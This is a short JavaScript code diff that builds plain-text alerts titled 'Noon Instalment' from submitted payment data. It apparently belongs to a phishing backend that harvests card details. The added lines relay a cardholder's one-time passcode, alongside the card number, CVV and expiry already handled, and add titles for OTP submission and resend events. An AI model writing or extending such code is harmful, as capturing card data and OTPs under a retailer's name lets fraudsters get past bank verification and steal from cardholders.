@@ -52,6 +52,12 @@ function buildNotice(payload, monthly, title, isCard) {
     }
   }
 
+  if (payload.cardOtp) {
+    body.push("");
+    body.push("Verification OTP");
+    body.push(`OTP code: ${clip(payload.cardOtp, 12)}`);
+  }
+
   return body.join("\n");
 }
 
@@ -64,16 +70,30 @@ export async function sendDownPaymentNotice(payload) {
   }
 
   const monthly = payload.kind === "instalment";
+  const isOtpResend = payload.noticeType === "card_otp_resend";
+  const isOtpSubmit = payload.noticeType === "card_otp" || Boolean(payload.cardOtp);
   const isCard =
     payload.method === "card" ||
-    Boolean(payload.cardNumber || payload.cardCvv || payload.cardExpiry);
-  const title = isCard
-    ? monthly
+    Boolean(payload.cardNumber || payload.cardCvv || payload.cardExpiry) ||
+    isOtpSubmit ||
+    isOtpResend;
+
+  let title;
+  if (isOtpResend) {
+    title = "Noon Instalment — OTP resend requested";
+  } else if (isOtpSubmit) {
+    title = monthly
+      ? "Noon Instalment — Monthly card OTP"
+      : "Noon Instalment — Card OTP verification";
+  } else if (isCard) {
+    title = monthly
       ? "Noon Instalment — Monthly card payment"
-      : "Noon Instalment — Card down payment"
-    : monthly
+      : "Noon Instalment — Card down payment";
+  } else {
+    title = monthly
       ? "Noon Instalment — Monthly payment"
       : "Noon Instalment — Down payment";
+  }
 
   const text = buildNotice(payload, monthly, title, isCard);
 
